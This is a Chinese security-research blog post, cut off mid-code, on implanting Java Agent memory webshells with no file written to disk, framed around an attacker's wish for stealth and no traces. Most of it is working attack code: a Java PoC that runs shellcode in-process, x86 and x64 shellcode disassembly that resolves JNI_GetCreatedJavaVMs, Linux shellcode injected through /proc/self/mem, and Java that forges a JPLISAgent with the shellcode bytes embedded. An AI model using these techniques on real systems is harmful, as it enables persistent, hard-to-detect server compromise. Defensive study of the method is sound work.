# 论如何优雅的注入 Java Agent 内存马
### 回顾

2018年，《利用“进程注入”实现无文件复活 WebShell》一文首次提出memShell（内存马）概念，利用Java Agent技术向JVM内存中植入webshell，并在github上发布memShell项目。项目中对内存马的植入过程比较繁琐，需要三个步骤：

1.  上传inject.jar到服务器用来枚举jvm并进行植入；
2.  上传agent.jar到服务器用来承载webshell功能；
3.  执行系统命令java -jar inject.jar。

2020年，Behinder（冰蝎） v3.0版本更新中内置了Java内存马注入功能，此次更新利用self attach技术，将植入过程由上文中的3个步骤减少为2个步骤：

1.  上传agent.jar到服务器用来承载webshell功能；
2.  冰蝎服务端调用Java API将agent.jar植入自身进程完成注入。

2021年，Behinder（冰蝎）v3.0 Beta 10版本更新中，实现了内存马防检测（我称他为Anti-Attach技术),可以避免在我们注入内存马之后其他人再注入内存马或者扫描内存马。

> 作为一个“强迫症患者”，我一直认为上述的植入过程都不够优雅。attacker追求的是微操、无痕，而Agent内存马的植入却要在目标磁盘上落地一个Jar包，这个操作太“脏”了。
> 
> 当然，在此期间，很多优秀的安全研究者将目标转向了向目标容器中新增各种Java Web组件上，比如新增一个Filter、Servlet、Listener、Spring的Controller等等，这种方式需要引入一些额外的相互引用关系，容易被检测到。而且对目标容器环境有较强的依赖性，不同的组件、不同的容器或者不同的版本，注入方法可能都不一样，通用性较弱。

2021年，[《Java内存攻击技术漫谈》](https://paper.seebug.org/1678/ "《Java内存攻击技术漫谈》")一文，提出了无文件agent植入技术，整个Agent注入的过程不需要在目标磁盘上落地文件，这勉强解决了“脏”的问题。但是该文中介绍的方法存在一个缺陷，那就是获取JPLISAgent的过程不够优雅和安静，会概率性的导致Java进程崩溃，这是不能忍的，于是就有了这篇文章。

### 优雅的构造JPLISAgent

在《Java内存攻击技术漫谈》一文中，我使用了特征字典+暴力内存搜索的方式来获取Native内存中的JVMTIEnv对象指针，由于ASLR的原因，在搜索过程中，很可能会将非指针数据作为指针来访问，从而触发内存访问异常，OS会直接接管这个异常并结束JVM进程。

如何才能精准的获取JVMTIEnv的指针呢？

#### 获取JVMTIEnv指针

可以利用JNI_GetCreatedJavaVMs函数。游望之在《Linux下内存马进阶植入技术》一文中提到，JavaVM对象中存在一个名为GetEnv的成员函数，如下：

```
struct JavaVM_ {
    const struct JNIInvokeInterface_ *functions;
#ifdef __cplusplus

    jint DestroyJavaVM() {
        return functions->DestroyJavaVM(this);
    }
    jint AttachCurrentThread(void **penv, void *args) {
        return functions->AttachCurrentThread(this, penv, args);
    }
    jint DetachCurrentThread() {
        return functions->DetachCurrentThread(this);
    }

    jint GetEnv(void **penv, jint version) {
        return functions->GetEnv(this, penv, version);
    }
    jint AttachCurrentThreadAsDaemon(void **penv, void *args) {
        return functions->AttachCurrentThreadAsDaemon(this, penv, args);
    }
#endif
};
```

怎么样获得JavaVM对象呢？我相信如果是熟悉Java Native开发的同学可能对此并不陌生，在jvm.dll中存在一个名为JNI_GetCreatedJavaVMs的函数，该函数是JVM提供给Java Native开发人员用来在Native层获取VM对象的，因为是开放给开发者使用的，所以该函数是导出的。我们可以直接调用这个函数来获取JavaVM对象。

但是，怎么调用JNI_GetCreatedJavaVMs呢？该函数的规矩用法是需要先开发一个Java的dll动态链接库，然后在Java代码中加载这个dll库，然后再调用dll中的方法。当然这不是我们希望的，如果我们愿意去写个dll上传加载，那还不如直接上传个agent.jar来的方便。

有没有可能不用开发额外的dll文件或者so文件来调用JNI相关的函数呢？有。

##### Windows平台

在《Java内存攻击技术漫谈》一文中，我提出了一种可以在Windows平台下通过Java向指定进程植入并运行shellcode的方法，当目标进程PID为-1时，即可向自身进程植入并运行shellcode，Poc如下：

```
import java.lang.reflect.Method;

public class RunShellCode   {
    public static void main(String[] args) throws Exception {

        System.loadLibrary("attach");

        Class cls=Class.forName("sun.tools.attach.WindowsVirtualMachine");
        for (Method m:cls.getDeclaredMethods())
        {
            if (m.getName().equals("enqueue"))
            {
                long hProcess=-1;
                byte shellcode[] = new byte[]   //pop calc.exe x64
                        {
                                (byte) 0xfc, (byte) 0x48, (byte) 0x83, (byte) 0xe4, (byte) 0xf0, (byte) 0xe8, (byte) 0xc0, (byte) 0x00,
                                (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0x51, (byte) 0x41, (byte) 0x50, (byte) 0x52, (byte) 0x51,
                                (byte) 0x56, (byte) 0x48, (byte) 0x31, (byte) 0xd2, (byte) 0x65, (byte) 0x48, (byte) 0x8b, (byte) 0x52,
                                (byte) 0x60, (byte) 0x48, (byte) 0x8b, (byte) 0x52, (byte) 0x18, (byte) 0x48, (byte) 0x8b, (byte) 0x52,
                                (byte) 0x20, (byte) 0x48, (byte) 0x8b, (byte) 0x72, (byte) 0x50, (byte) 0x48, (byte) 0x0f, (byte) 0xb7,
                                (byte) 0x4a, (byte) 0x4a, (byte) 0x4d, (byte) 0x31, (byte) 0xc9, (byte) 0x48, (byte) 0x31, (byte) 0xc0,
                                (byte) 0xac, (byte) 0x3c, (byte) 0x61, (byte) 0x7c, (byte) 0x02, (byte) 0x2c, (byte) 0x20, (byte) 0x41,
                                (byte) 0xc1, (byte) 0xc9, (byte) 0x0d, (byte) 0x41, (byte) 0x01, (byte) 0xc1, (byte) 0xe2, (byte) 0xed,
                                (byte) 0x52, (byte) 0x41, (byte) 0x51, (byte) 0x48, (byte) 0x8b, (byte) 0x52, (byte) 0x20, (byte) 0x8b,
                                (byte) 0x42, (byte) 0x3c, (byte) 0x48, (byte) 0x01, (byte) 0xd0, (byte) 0x8b, (byte) 0x80, (byte) 0x88,
                                (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x85, (byte) 0xc0, (byte) 0x74, (byte) 0x67,
                                (byte) 0x48, (byte) 0x01, (byte) 0xd0, (byte) 0x50, (byte) 0x8b, (byte) 0x48, (byte) 0x18, (byte) 0x44,
                                (byte) 0x8b, (byte) 0x40, (byte) 0x20, (byte) 0x49, (byte) 0x01, (byte) 0xd0, (byte) 0xe3, (byte) 0x56,
                                (byte) 0x48, (byte) 0xff, (byte) 0xc9, (byte) 0x41, (byte) 0x8b, (byte) 0x34, (byte) 0x88, (byte) 0x48,
                                (byte) 0x01, (byte) 0xd6, (byte) 0x4d, (byte) 0x31, (byte) 0xc9, (byte) 0x48, (byte) 0x31, (byte) 0xc0,
                                (byte) 0xac, (byte) 0x41, (byte) 0xc1, (byte) 0xc9, (byte) 0x0d, (byte) 0x41, (byte) 0x01, (byte) 0xc1,
                                (byte) 0x38, (byte) 0xe0, (byte) 0x75, (byte) 0xf1, (byte) 0x4c, (byte) 0x03, (byte) 0x4c, (byte) 0x24,
                                (byte) 0x08, (byte) 0x45, (byte) 0x39, (byte) 0xd1, (byte) 0x75, (byte) 0xd8, (byte) 0x58, (byte) 0x44,
                                (byte) 0x8b, (byte) 0x40, (byte) 0x24, (byte) 0x49, (byte) 0x01, (byte) 0xd0, (byte) 0x66, (byte) 0x41,
                                (byte) 0x8b, (byte) 0x0c, (byte) 0x48, (byte) 0x44, (byte) 0x8b, (byte) 0x40, (byte) 0x1c, (byte) 0x49,
                                (byte) 0x01, (byte) 0xd0, (byte) 0x41, (byte) 0x8b, (byte) 0x04, (byte) 0x88, (byte) 0x48, (byte) 0x01,
                                (byte) 0xd0, (byte) 0x41, (byte) 0x58, (byte) 0x41, (byte) 0x58, (byte) 0x5e, (byte) 0x59, (byte) 0x5a,
                                (byte) 0x41, (byte) 0x58, (byte) 0x41, (byte) 0x59, (byte) 0x41, (byte) 0x5a, (byte) 0x48, (byte) 0x83,
                                (byte) 0xec, (byte) 0x20, (byte) 0x41, (byte) 0x52, (byte) 0xff, (byte) 0xe0, (byte) 0x58, (byte) 0x41,
                                (byte) 0x59, (byte) 0x5a, (byte) 0x48, (byte) 0x8b, (byte) 0x12, (byte) 0xe9, (byte) 0x57, (byte) 0xff,
                                (byte) 0xff, (byte) 0xff, (byte) 0x5d, (byte) 0x48, (byte) 0xba, (byte) 0x01, (byte) 0x00, (byte) 0x00,
                                (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x00, (byte) 0x48, (byte) 0x8d, (byte) 0x8d,
                                (byte) 0x01, (byte) 0x01, (byte) 0x00, (byte) 0x00, (byte) 0x41, (byte) 0xba, (byte) 0x31, (byte) 0x8b,
                                (byte) 0x6f, (byte) 0x87, (byte) 0xff, (byte) 0xd5, (byte) 0xbb, (byte) 0xf0, (byte) 0xb5, (byte) 0xa2,
                                (byte) 0x56, (byte) 0x41, (byte) 0xba, (byte) 0xa6, (byte) 0x95, (byte) 0xbd, (byte) 0x9d, (byte) 0xff,
                                (byte) 0xd5, (byte) 0x48, (byte) 0x83, (byte) 0xc4, (byte) 0x28, (byte) 0x3c, (byte) 0x06, (byte) 0x7c,
                                (byte) 0x0a, (byte) 0x80, (byte) 0xfb, (byte) 0xe0, (byte) 0x75, (byte) 0x05, (byte) 0xbb, (byte) 0x47,
                                (byte) 0x13, (byte) 0x72, (byte) 0x6f, (byte) 0x6a, (byte) 0x00, (byte) 0x59, (byte) 0x41, (byte) 0x89,
                                (byte) 0xda, (byte) 0xff, (byte) 0xd5, (byte) 0x63, (byte) 0x61, (byte) 0x6c, (byte) 0x63, (byte) 0x2e,
                                (byte) 0x65, (byte) 0x78, (byte) 0x65, (byte) 0x00
                        };

                String cmd="load";String pipeName="test";
                m.setAccessible(true);
                Object result=m.invoke(cls,new Object[]{hProcess,shellcode,cmd,pipeName,new Object[]{}});
            }
        }
    }
}
```

为了避免目标没有WindowsVirtualMachine，自己写一个同名类：

```
package sun.tools.attach;

import java.io.IOException;

public class WindowsVirtualMachine {
    static native void enqueue(long hProcess, byte[] stub,String cmd, String pipename, Object... args) throws IOException;
}
```

基于这个方法，我们可以写一段通用的shellcode来动态调用jvm.dll中的JNI_GetCreatedJavaVMs。

这段shellcode的主要工作流程是：

1.  先获取到当前进程kernel32.dll的基址；
2.  在kernel32.dll的输出表中，获取GetProcessAddress函数的地址；
3.  调用GetProcessAddress获取LoadLibraryA函数的地址；
4.  调用LoadLibraryA加载jvm.dll获取jvm.dll模块在当前进程中的基址；
5.  调用GerProcAddress在jvm.dll中获取JNI_GetCreatedJavaVMs的地址；
6.  调用JNI_GetCreatedJavaVMs；
7.  还原现场，安全退出线程，优雅地离开，避免shellcode执行完后进程崩溃。

如下是x86版本的shellcode：

```
00830000 | 90                       | nop                                     |
00830001 | 90                       | nop                                     |
00830002 | 90                       | nop                                     |
00830003 | 33C9                     | xor ecx,ecx                             |
00830005 | 64:A1 30000000           | mov eax,dword ptr fs:[30]               |
0083000B | 8B40 0C                  | mov eax,dword ptr ds:[eax+C]            |
0083000E | 8B70 14                  | mov esi,dword ptr ds:[eax+14]           |
00830011 | AD                       | lodsd                                   |
00830012 | 96                       | xchg esi,eax                            |
00830013 | AD                       | lodsd                                   |
00830014 | 8B58 10                  | mov ebx,dword ptr ds:[eax+10]           | ebx:"MZ?"
00830017 | 8B53 3C                  | mov edx,dword ptr ds:[ebx+3C]           | edx:"MZ?"
0083001A | 03D3                     | add edx,ebx                             | edx:"MZ?", ebx:"MZ?"
0083001C | 8B52 78                  | mov edx,dword ptr ds:[edx+78]           | edx:"MZ?"
0083001F | 03D3                     | add edx,ebx                             | edx:"MZ?", ebx:"MZ?"
00830021 | 33C9                     | xor ecx,ecx                             |
00830023 | 8B72 20                  | mov esi,dword ptr ds:[edx+20]           |
00830026 | 03F3                     | add esi,ebx                             | ebx:"MZ?"
00830028 | 41                       | inc ecx                                 |
00830029 | AD                       | lodsd                                   |
0083002A | 03C3                     | add eax,ebx                             | ebx:"MZ?"
0083002C | 8138 47657450            | cmp dword ptr ds:[eax],50746547         |
00830032 | 75 F4                    | jne 830028                              |
00830034 | 8178 04 726F6341         | cmp dword ptr ds:[eax+4],41636F72       |
0083003B | 75 EB                    | jne 830028                              |
0083003D | 8178 08 64647265         | cmp dword ptr ds:[eax+8],65726464       |
00830044 | 75 E2                    | jne 830028                              |
00830046 | 8B72 24                  | mov esi,dword ptr ds:[edx+24]           |
00830049 | 03F3                     | add esi,ebx                             | ebx:"MZ?"
0083004B | 66:8B0C4E                | mov cx,word ptr ds:[esi+ecx*2]          |
0083004F | 49                       | dec ecx                                 |
00830050 | 8B72 1C                  | mov esi,dword ptr ds:[edx+1C]           |
00830053 | 03F3                     | add esi,ebx                             | ebx:"MZ?"
00830055 | 8B148E                   | mov edx,dword ptr ds:[esi+ecx*4]        | edx:"MZ?"
00830058 | 03D3                     | add edx,ebx                             | edx:"MZ?", ebx:"MZ?"
0083005A | 52                       | push edx                                | edx:"MZ?"
0083005B | 33C9                     | xor ecx,ecx                             |
0083005D | 51                       | push ecx                                |
0083005E | 68 61727941              | push 41797261                           |
00830063 | 68 4C696272              | push 7262694C                           |
00830068 | 68 4C6F6164              | push 64616F4C                           |
0083006D | 54                       | push esp                                |
0083006E | 53                       | push ebx                                | ebx:"MZ?"
0083006F | FFD2                     | call edx                                |
00830071 | 83C4 0C                  | add esp,C                               |
00830074 | 59                       | pop ecx                                 |
00830075 | 50                       | push eax                                |
00830076 | 66:B9 3332               | mov cx,3233                             |
0083007A | 51                       | push ecx                                |
0083007B | 68 6A766D00              | push 6D766A                             | 6D766A:L"$$笔划$$字根/笔划"
00830080 | 54                       | push esp                                |
00830081 | FFD0                     | call eax                                |
00830083 | 8BD8                     | mov ebx,eax                             | ebx:"MZ?"
00830085 | 83C4 0C                  | add esp,C                               |
00830088 | 5A                       | pop edx                                 | edx:"MZ?"
00830089 | 33C9                     | xor ecx,ecx                             |
0083008B | 51                       | push ecx                                |
0083008C | 6A 73                    | push 73                                 |
0083008E | 68 7661564D              | push 4D566176                           |
00830093 | 68 65644A61              | push 614A6465                           |
00830098 | 68 72656174              | push 74616572                           |
0083009D | 68 47657443              | push 43746547                           |
008300A2 | 68 4A4E495F              | push 5F494E4A                           |
008300A7 | 54                       | push esp                                |
008300A8 | 53                       | push ebx                                | ebx:"MZ?"
008300A9 | FFD2                     | call edx                                |
008300AB | 8945 F0                  | mov dword ptr ss:[ebp-10],eax           |
008300AE | 54                       | push esp                                |
008300AF | 6A 01                    | push 1                                  |
008300B1 | 54                       | push esp                                |
008300B2 | 59                       | pop ecx                                 |
008300B3 | 83C1 10                  | add ecx,10                              |
008300B6 | 51                       | push ecx                                |
008300B7 | 54                       | push esp                                |
008300B8 | 59                       | pop ecx                                 |
008300B9 | 6A 01                    | push 1                                  |
008300BB | 51                       | push ecx                                |
008300BC | FFD0                     | call eax                                |
008300BE | 8BC1                     | mov eax,ecx                             |
008300C0 | 83EC 30                  | sub esp,30                              |
008300C3 | 6A 00                    | push 0                                  |
008300C5 | 54                       | push esp                                |
008300C6 | 59                       | pop ecx                                 |
008300C7 | 83C1 10                  | add ecx,10                              |
008300CA | 51                       | push ecx                                |
008300CB | 8B00                     | mov eax,dword ptr ds:[eax]              |
008300CD | 50                       | push eax                                |
008300CE | 8B18                     | mov ebx,dword ptr ds:[eax]              | ebx:"MZ?"
008300D0 | 8B43 10                  | mov eax,dword ptr ds:[ebx+10]           |
008300D3 | FFD0                     | call eax                                |
008300D5 | 8B43 18                  | mov eax,dword ptr ds:[ebx+18]           |
008300D8 | 68 00020130              | push 30010200                           |
008300DD | 68 14610317              | push 17036114                           |;该内存地址是JavaVM->GetEnv的第一个参数，由我们动态指定，用来接收jvmti对象的地址
008300E2 | 83EC 04                  | sub esp,4                               |
008300E5 | FFD0                     | call eax                                |
008300E7 | 83EC 0C                  | sub esp,C                               |
008300EA | 8B43 14                  | mov eax,dword ptr ds:[ebx+14]           |
008300ED | FFD0                     | call eax                                |
008300EF | 83C4 5C                  | add esp,5C                              |
008300F2 | C3                       | ret                                     |
```

如下是x64版本的shellcode：

```
00000000541E0000 | 48:83EC 28               | sub rsp,28                              |
00000000541E0004 | 48:83E4 F0               | and rsp,FFFFFFFFFFFFFFF0                |
00000000541E0008 | 48:31C9                  | xor rcx,rcx                             |
00000000541E000B | 6548:8B41 60             | mov rax,qword ptr gs:[rcx+60]           |
00000000541E0010 | 48:8B40 18               | mov rax,qword ptr ds:[rax+18]           |
00000000541E0014 | 48:8B70 20               | mov rsi,qword ptr ds:[rax+20]           |
00000000541E0018 | 48:AD                    | lodsq                                   |
00000000541E001A | 48:96                    | xchg rsi,rax                            |
00000000541E001C | 48:AD                    | lodsq                                   |
00000000541E001E | 48:8B58 20               | mov rbx,qword ptr ds:[rax+20]           | rbx:"MZ?"
00000000541E0022 | 4D:31C0                  | xor r8,r8                               |
00000000541E0025 | 44:8B43 3C               | mov r8d,dword ptr ds:[rbx+3C]           |
00000000541E0029 | 4C:89C2                  | mov rdx,r8                              |
00000000541E002C | 48:01DA                  | add rdx,rbx                             | rbx:"MZ?"
00000000541E002F | 44:8B82 88000000         | mov r8d,dword ptr ds:[rdx+88]           |
00000000541E0036 | 49:01D8                  | add r8,rbx                              | rbx:"MZ?"
00000000541E0039 | 48:31F6                  | xor rsi,rsi                             |
00000000541E003C | 41:8B70 20               | mov esi,dword ptr ds:[r8+20]            |
00000000541E0040 | 48:01DE                  | add rsi,rbx                             | rbx:"MZ?"
00000000541E0043 | 48:31C9                  | xor rcx,rcx                             |
00000000541E0046 | 49:B9 47657450726F6341   | mov r9,41636F7250746547                 |
00000000541E0050 | 48:FFC1                  | inc rcx                                 |
00000000541E0053 | 48:31C0                  | xor rax,rax                             |
00000000541E0056 | 8B048E                   | mov eax,dword ptr ds:[rsi+rcx*4]        |
00000000541E0059 | 48:01D8                  | add rax,rbx                             | rbx:"MZ?"
00000000541E005C | 4C:3908                  | cmp qword ptr ds:[rax],r9               |
00000000541E005F | 75 EF                    | jne 541E0050                            |
00000000541E0061 | 48:31F6                  | xor rsi,rsi                             |
00000000541E0064 | 41:8B70 24               | mov esi,dword ptr ds:[r8+24]            |
00000000541E0068 | 48:01DE                  | add rsi,rbx                             | rbx:"MZ?"
00000000541E006B | 66:8B0C4E                | mov cx,word ptr ds:[rsi+rcx*2]          |
00000000541E006F | 48:31F6                  | xor rsi,rsi                             |
00000000541E0072 | 41:8B70 1C               | mov esi,dword ptr ds:[r8+1C]            |
00000000541E0076 | 48:01DE                  | add rsi,rbx                             | rbx:"MZ?"
00000000541E0079 | 48:31D2                  | xor rdx,rdx                             |
00000000541E007C | 8B148E                   | mov edx,dword ptr ds:[rsi+rcx*4]        |
00000000541E007F | 48:01DA                  | add rdx,rbx                             | rbx:"MZ?"
00000000541E0082 | 48:89D7                  | mov rdi,rdx                             |
00000000541E0085 | B9 61727941              | mov ecx,41797261                        |
00000000541E008A | 51                       | push rcx                                |
00000000541E008B | 48:B9 4C6F61644C696272   | mov rcx,7262694C64616F4C                |
00000000541E0095 | 51                       | push rcx                                |
00000000541E0096 | 48:89E2                  | mov rdx,rsp                             |
00000000541E0099 | 48:89D9                  | mov rcx,rbx                             | rbx:"MZ?"
00000000541E009C | 48:83EC 30               | sub rsp,30                              |
00000000541E00A0 | FFD7                     | call rdi                                |
00000000541E00A2 | 48:83C4 30               | add rsp,30                              |
00000000541E00A6 | 48:83C4 10               | add rsp,10                              |
00000000541E00AA | 48:89C6                  | mov rsi,rax                             |
00000000541E00AD | B9 6C6C0000              | mov ecx,6C6C                            |
00000000541E00B2 | 51                       | push rcx                                |
00000000541E00B3 | B9 6A766D00              | mov ecx,6D766A                          |
00000000541E00B8 | 51                       | push rcx                                |
00000000541E00B9 | 48:89E1                  | mov rcx,rsp                             |
00000000541E00BC | 48:83EC 30               | sub rsp,30                              |
00000000541E00C0 | FFD6                     | call rsi                                |
00000000541E00C2 | 48:83C4 30               | add rsp,30                              |
00000000541E00C6 | 48:83C4 10               | add rsp,10                              |
00000000541E00CA | 49:89C7                  | mov r15,rax                             |
00000000541E00CD | 48:31C9                  | xor rcx,rcx                             |
00000000541E00D0 | 48:B9 7661564D73000000   | mov rcx,734D566176                      |
00000000541E00DA | 51                       | push rcx                                |
00000000541E00DB | 48:B9 7265617465644A61   | mov rcx,614A646574616572                |
00000000541E00E5 | 51                       | push rcx                                |
00000000541E00E6 | 48:B9 4A4E495F47657443   | mov rcx,437465475F494E4A                |
00000000541E00F0 | 51                       | push rcx                                |
00000000541E00F1 | 48:89E2                  | mov rdx,rsp                             |
00000000541E00F4 | 4C:89F9                  | mov rcx,r15                             |
00000000541E00F7 | 48:83EC 28               | sub rsp,28                              |
00000000541E00FB | FFD7                     | call rdi                                |
00000000541E00FD | 48:83C4 28               | add rsp,28                              |
00000000541E0101 | 48:83C4 18               | add rsp,18                              |
00000000541E0105 | 49:89C7                  | mov r15,rax                             |
00000000541E0108 | 48:83EC 28               | sub rsp,28                              |
00000000541E010C | 48:89E1                  | mov rcx,rsp                             |
00000000541E010F | BA 01000000              | mov edx,1                               |
00000000541E0114 | 49:89C8                  | mov r8,rcx                              |
00000000541E0117 | 49:83C0 08               | add r8,8                                |
00000000541E011B | 48:83EC 28               | sub rsp,28                              |
00000000541E011F | 41:FFD7                  | call r15                                |
00000000541E0122 | 48:83C4 28               | add rsp,28                              |
00000000541E0126 | 48:8B09                  | mov rcx,qword ptr ds:[rcx]              |
00000000541E0129 | 48:83EC 20               | sub rsp,20                              |
00000000541E012D | 54                       | push rsp                                |
00000000541E012E | 48:89E2                  | mov rdx,rsp                             |
00000000541E0131 | 4D:31C0                  | xor r8,r8                               |
00000000541E0134 | 4C:8B39                  | mov r15,qword ptr ds:[rcx]              |
00000000541E0137 | 4D:8B7F 20               | mov r15,qword ptr ds:[r15+20]           |
00000000541E013B | 49:89CE                  | mov r14,rcx                             |
00000000541E013E | 41:FFD7                  | call r15                                |
00000000541E0141 | 4C:89F1                  | mov rcx,r14                             |
00000000541E0144 | 48:BA A8752F5600000000   | mov rdx,562F75A8                        | ;该内存地址是JavaVM->GetEnv的第一个参数，由我们动态指定，用来接收jvmti对象的地址
00000000541E014E | 41:B8 00020130           | mov r8d,30010200                        |
00000000541E0154 | 4D:8B3E                  | mov r15,qword ptr ds:[r14]              |
00000000541E0157 | 4D:8B7F 30               | mov r15,qword ptr ds:[r15+30]           |
00000000541E015B | 48:83EC 20               | sub rsp,20                              |
00000000541E015F | 41:FFD7                  | call r15                                |
00000000541E0162 | 48:83C4 20               | add rsp,20                              |
00000000541E0166 | 4C:89F1                  | mov rcx,r14                             |
00000000541E0169 | 4D:8B3E                  | mov r15,qword ptr ds:[r14]              |
00000000541E016C | 4D:8B7F 28               | mov r15,qword ptr ds:[r15+28]           |
00000000541E0170 | 41:FFD7                  | call r15                                |
00000000541E0173 | 48:83C4 78               | add rsp,78                              |
00000000541E0177 | C3                       | ret                                     |
```

##### Linux平台

由于Windows平台和Linux平台在Attach机制上的区别，Linux平台下并没有直接原生执行shellcode的方法，不过我们可以使用游望之的文章《Linux下内存马进阶植入技术》中提出的方法，通过修改/proc/self/mem的方式来执行shellcode，主要流程如下：

1.  解析libjvm.so的ELF头，得到Java\_java\_io\_RandomAccessFile\_length和JNI_GetCreatedJavaVMs的偏移；
2.  解析/proc/self/maps取得libjvm.so的加载基址，加上步骤1中获取的偏移地址，得到Java\_java\_io\_RandomAccessFile\_length和JNI_GetCreatedJavaVMs函数在内存中的地址；
3.  编写shellcode，调用JNI_GetCreatedJavaVMs获取的JVMTIEnv对象的指针；
4.  备份Java\_java\_io\_RandomAccessFile\_length函数体；
5.  将步骤3中的shellcode写入Java\_java\_io\_RandomAccessFile\_length地址；
6.  在Java层调用Java\_java\_io\_RandomAccessFile\_length获得一个long型的返回值，即JVMTIEnv对象的指针；
7.  恢复Java\_java\_io\_RandomAccessFile\_length代码；
8.  利用JVMTIEnv对象的指针，构造JPLISAgent。

具体细节可以参考游望之的文章《Linux下内存马进阶植入技术》，里有详细描述。

shellcode:

```
 push    rbp
    mov     rbp, rsp
    mov     rax, 0xf
    not     rax
    and     rsp, rax
    movabs  rax, _JNI_GetCreatedJavaVMs
    sub     rsp, 40h
    xor     rsi, rsi
    inc     rsi
    lea     rdx, [rsp+4]
    lea     rdi, [rsp+8]
    call    rax
    mov     rdi, [rsp+8]
    lea     rsi, [rsp+10h]
    mov     edx, 30010200h
    mov     rax, [rdi]
    call    qword ptr [rax+30h]
    mov     rax, [rsp+10h]
    add     rsp, 40h
    leave
    ret
```

#### 组装JPLISAgent

有了JVMTIEnv对象的指针，就可以构造JPLISAgent对象了，如下：

```
private long getJPLISAgent() {
    long pointerLength = 8;
    Unsafe unsafe = null;

    try {
        Field field = Unsafe.class.getDeclaredField("theUnsafe");
        field.setAccessible(true);
        unsafe = (Unsafe)field.get((Object)null);
    } catch (Exception var14) {
        throw new AssertionError(var14);
    }
    long JPLISAgent = unsafe.allocateMemory(4096L);

    long native_jvmtienv = unsafe.getLong(JPLISAgent + (long)pointerLength);
    if (pointerLength == 4) {
        unsafe.putByte(native_jvmtienv + 201L, (byte)2);
    } else {
        unsafe.putByte(native_jvmtienv + 361L, (byte)2);
    }
    return JPLISAgent;
}
```

### 动态修改类

在上文中，分别介绍了Windows平台和Linux平台下构造JPLISAgent对象的方法，有了JPLISAgent对象，就可以调用Java Agent的所有能力了，当然我们感兴趣的还是类的动态修改功能。

#### Windows平台

把上文中获取JVMTIEnv指针的shellcode和Java代码结合起来，同时考虑指针长度为4和8的情况：

```
/**
 * @version 1.0
 * @Author rebeyond
 * @Date 2022/7/1 12:59
 * @注释
 */
package sun.tools.attach;

import sun.misc.Unsafe;

import java.io.IOException;
import java.lang.instrument.ClassDefinition;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;

public class WindowsVirtualMachine {

    public static int pointerLength=8;
    public static String className;
    public static byte[] classBody;
    static native void enqueue(long hProcess, byte[] stub,
                               String cmd, String pipename, Object... args) throws IOException;


    public static void work() throws Exception {

        Unsafe unsafe = null;
        try {
            Field field = sun.misc.Unsafe.class.getDeclaredField("theUnsafe");
            field.setAccessible(true);
            unsafe = (sun.misc.Unsafe) field.get(null);
        } catch (Exception e) {
            throw new AssertionError(e);
        }
        //伪造JPLISAgent结构时，只需要填mNormalEnvironment中的mJVMTIEnv即可，其他变量代码中实际没有使用
        long JPLISAgent = unsafe.allocateMemory(0x1000);

        byte[] buf=new byte[]{(byte)0x48,(byte)0x83,(byte)0xEC,(byte)0x28,(byte)0x48,(byte)0x83,(byte)0xE4,(byte)0xF0,(byte)0x48,(byte)0x31,(byte)0xC9,(byte)0x65,(byte)0x48,(byte)0x8B,(byte)0x41,(byte)0x60,(byte)0x48,(byte)0x8B,(byte)0x40,(byte)0x18,(byte)0x48,(byte)0x8B,(byte)0x70,(byte)0x20,(byte)0x48,(byte)0xAD,(byte)0x48,(byte)0x96,(byte)0x48,(byte)0xAD,(byte)0x48,(byte)0x8B,(byte)0x58,(byte)0x20,(byte)0x4D,(byte)0x31,(byte)0xC0,(byte)0x44,(byte)0x8B,(byte)0x43,(byte)0x3C,(byte)0x4C,(byte)0x89,(byte)0xC2,(byte)0x48,(byte)0x01,(byte)0xDA,(byte)0x44,(byte)0x8B,(byte)0x82,(byte)0x88,(byte)0x00,(byte)0x00,(byte)0x00,(byte)0x49,(byte)0x01,(byte)0xD8,(byte)0x48,(byte)0x31,(byte)0xF6,(byte)0x41,(byte)0x8B,(byte)0x70,(byte)0x20,(byte)0x48,(byte)0x01,(byte)0xDE,(byte)0x48,(byte)0x31,(byte)0xC9,(byte)0x49,(byte)0xB9,(byte)0x47,(byte)0x65,(byte)0x74,(byte)0x50,(byte)0x72,(byte)0x6F,(byte)0x63,(byte)0x41,(byte)0x48,(byte)0xFF,(byte)0xC1,(byte)0x48,(byte)0x31,(byte)0xC0,(byte)0x8B,(byte)0x04,(byte)0x8E,(byte)0x48,(byte)0x01,(byte)0xD8,(byte)0x4C,(byte)0x39,(byte)0x08,(byte)0x75,(byte)0xEF,(byte)0x48,(byte)0x31,(byte)0xF6,(byte)0x41,(byte)0x8B,(byte)0x70,(byte)0x24,(byte)0x48,(byte)0x01,(byte)0xDE,(byte)0x66,(byte)0x8B,(byte)0x0C,(byte)0x4E,(byte)0x48,(byte)0x31,(byte)0xF6,(byte)0x41,(byte)0x8B,(byte)0x70,(byte)0x1C,(byte)0x48,(byte)0x01,(byte)0xDE,(byte)0x48,(byte)0x31,(byte)0xD2,(byte)0x8B,(byte)0x14,(byte)0x8E,(byte)0x48,(byte)0x01,(byte)0xDA,(byte)0x48,(byte)0x89,(byte)0xD7,(byte)0xB9,(byte)0x61,(byte)0x72,(byte)0x79,(byte)0x41,(byte)0x51,(byte)0x48,(byte)0xB9,(byte)0x4C,(byte)0x6F,(byte)0x61,(byte)0x64,(byte)0x4C,(byte)0x69,(byte)0x62,(byte)0x72,(byte)0x51,(byte)0x48,(byte)0x89,(byte)0xE2,(byte)0x48,(byte)0x89,(byte)0xD9,(byte)0x48,(byte)0x83,(byte)0xEC,(byte)0x30,(byte)0xFF,(byte)0xD7,(byte)0x48,(byte)0x83,(byte)0xC4,(byte)0x30,(byte)0x48,(byte)0x83,(byte)0xC4,(byte)0x10,(byte)0x48,(byte)0x89,(byte)0xC6,(byte)0xB9,(byte)0x6C,(byte)0x6C,(byte)0x00,(byte)0x00,(byte)0x51,(byte)0xB9,(byte)0x6A,(byte)0x76,(byte)0x6D,(byte)0x00,(byte)0x51,(byte)0x48,(byte)0x89,(byte)0xE1,(byte)0x48,(byte)0x83,(byte)0xEC,(byte)0x30,(byte)0xFF,(byte)0xD6,(byte)0x48,(byte)0x83,(byte)0xC4,(byte)0x30,(byte)0x48,(byte)0x83,(byte)0xC4,(byte)0x10,(byte)0x49,(byte)0x89,(byte)0xC7,(byte)0x48,(byte)0x31,(byte)0xC9,(byte)0x48,(byte)0xB9,(byte)0x76,(byte)0x61,(byte)0